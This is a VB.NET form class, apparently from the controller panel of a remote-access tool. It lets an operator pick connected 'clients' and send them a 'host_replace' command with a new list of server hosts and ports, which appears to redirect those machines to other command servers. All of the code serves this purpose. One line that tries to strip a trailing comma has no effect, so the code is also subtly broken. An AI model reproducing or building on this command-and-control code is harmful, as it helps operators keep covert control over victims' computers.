﻿Public Class Host_replace

    Private n$ = Nothing
    Sub host_re(ByVal idstr As String)
        n = idstr
        Dim ary$() = n.Trim.Split(",")
        title(Text & " - Clients:{0}", ary.Length - 1)
    End Sub
    Private Sub title(t As String, i As String)
        Dim title As String = String.Format(t, i)
        Text = title

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click





        Dim ErrorCounter% = 0
        If DataGridView1.SelectedRows.Count <= 0 Then
            Me.ErrorProvider1.SetError(DataGridView1, "Cannot be Empty")
        Else
            Me.ErrorProvider1.SetError(DataGridView1, Nothing)
            ErrorCounter += 1
        End If
        For Each ctrl As Control In GroupBox2.Controls
            If TypeName(ctrl) = "TextBox" Then
                If ctrl.Tag = "ERROR" Then
                    If ctrl.Text.Length = 0 Then
                        Me.ErrorProvider1.SetError(ctrl, "Cannot be Empty")
                    Else
                        Me.ErrorProvider1.SetError(ctrl, Nothing)
                        ErrorCounter += 1
                    End If
                End If
            End If
        Next


        If ErrorCounter = 2 Then
            Me.DialogResult = DialogResult.OK
            Dim ary$() = n.Trim.Split(",")
            Dim GroupDns$ = Nothing
            For Each i In ary
                If IsNumeric(i) Then
                    If DataGridView1.SelectedRows.Count > 0 Then
                        For r% = 0 To DataGridView1.Rows.Count - 1
                            GroupDns += DataGridView1.Rows(r).Cells(0).Value + "," + DataGridView1.Rows(r).Cells(1).Value + ","
                        Next
                    End If
                    If GroupDns.EndsWith(",") Then
                        GroupDns.ToString.Remove(GroupDns.ToString.Length - 1).ToString()
                    End If
                    Form1.s.Send(i, "host_replace" + Form1.s.SplitData + GroupDns + Form1.s.SplitData + TextBox2.Text)
                End If
            Next
        End If
    End Sub

    Private Sub Host_replace_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        NumericUpDown1.Value = My.Settings.SVPORT
        TextBox1.Text = My.Settings.SVHOST
        TextBox2.Text = My.Settings.BIINFO2
        ErrorProvider1.Icon = store_0.icons_0("errors")
        Me.Icon = store_0.icons_0("window")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click

        If Not TextBox1.Text = Nothing And Not CStr(NumericUpDown1.Value) = "0" Then
            DataGridView1.Rows.Add(TextBox1.Text, CStr(NumericUpDown1.Value))
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1

                DataGridView1.Rows.RemoveAt(DataGridView1.SelectedRows(i).Index)
            Next
        End If
    End Sub



    Private Sub Host_replace_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        ErrorProvider1.Clear()

    End Sub


End Class
